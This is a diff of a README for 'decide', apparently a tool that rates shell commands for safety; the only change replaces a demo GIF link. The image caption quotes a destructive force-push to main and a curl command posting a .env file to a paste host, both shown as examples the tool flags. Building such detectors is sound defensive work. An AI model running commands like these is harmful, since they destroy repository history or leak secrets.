@@ -17,7 +17,7 @@ decide run security src                                  # rank a codebase
 Run it from your shell, in CI, or from
 [Claude Code](#audit-a-whole-codebase-from-claude-code).
 
-[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-8048b29e5adf.gif)](https://decide.deepnoodle.ai)
+[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-0601ee0f2299.gif)](https://decide.deepnoodle.ai)
 
 ## Why not just call an LLM?
 
